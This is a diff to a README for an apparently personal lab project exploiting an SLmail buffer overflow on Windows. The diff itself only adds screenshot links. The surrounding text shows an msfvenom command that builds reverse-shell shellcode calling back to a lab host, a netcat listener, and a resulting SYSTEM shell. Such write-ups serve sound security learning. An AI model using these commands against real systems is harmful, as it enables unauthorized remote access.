@@ -161,17 +161,23 @@ This project is centered on understanding and executing a Windows buffer overflo
 - Crafted shellcode with **“msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=10.0.2.6 -f c -b "\x00\x0a\x0d"”**.
 
 <p align="center">
-  <img src="" alt="">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF24.png" alt="">
 </p>
 
 - Updated “fuzzy.py” with the crafted shell code.
 
 <p align="center">
-  <img src="" alt="">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF25.png" alt="">
 </p>
 
 - Set up a listener on Kali with **“nc -lvp 4444”**.
 
-
+<p align="center">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF26.png" alt="">
+</p>
 
 - Restarted SLmail, ran **“fuzzy.py”**. The netcat listener received the code, granting system access. Confirmed with **“whoami”** command showing “nt authority\system”.
+
+<p align="center">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF27.png" alt="">
+</p>
